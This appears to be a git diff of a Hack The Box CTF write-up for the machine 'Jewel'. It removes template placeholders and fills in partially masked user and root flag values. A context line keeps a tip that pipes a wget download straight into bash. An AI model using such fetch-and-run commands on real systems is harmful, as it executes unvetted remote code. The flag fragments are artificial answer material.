@@ -9,9 +9,8 @@ avatar: assets/htb/jewel.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Jewel
 ---
-## Overview
 
-Short description to include any strange things to be dealt with
+## Overview
 
 TODO: finish writeup and clean up
 
@@ -24,10 +23,6 @@ wget -O - -q $url:$port/$file | bash
 ```
 
 * that extra \(`-`\) is important, don't leave it out!
-
-#### Useful thing 2
-
-* description with generic example
 
 ## Enumeration
 
@@ -478,7 +473,7 @@ There was a few interesting hidden files in `bill`'s home folder, including one 
 
 ```text
 bill@jewel:~$ cat user.txt 
-****
+9688****83b2
 ```
 
 I was happy to see that `bill` had the `user.txt` flag in his home directory!
@@ -788,9 +783,5 @@ drwxr-xr-x 2 root root 4096 Aug 26 09:35 exe
 # ls
 root.txt
 # cat root.txt
-****
+ccd6****0448
 ```
-
-After that I collected my hard-earned proof, then set my clock back to normal!
-
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-jewel-pwned.png)
